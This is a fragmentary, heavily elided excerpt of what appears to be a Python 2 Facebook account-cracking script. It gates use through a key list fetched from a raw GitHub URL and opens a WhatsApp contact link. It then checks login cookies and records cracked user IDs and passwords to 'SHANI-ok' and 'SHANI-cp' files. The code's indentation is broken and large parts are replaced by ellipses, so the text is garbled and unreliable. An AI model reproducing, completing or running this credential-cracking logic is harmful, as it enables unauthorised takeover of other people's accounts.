...
def main_apv():
    ...
    try:
        ...
        os.system("xdg-open https://wa.me/+923118066577")
            r1=requests.get("https://raw.githubusercontent.com/SHANIUSTAD/Zeeshn/main/Zeeshn.py/server.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass6
                                                        ok=open('SHANI-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass6
                                                            cp=open('SHANI-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
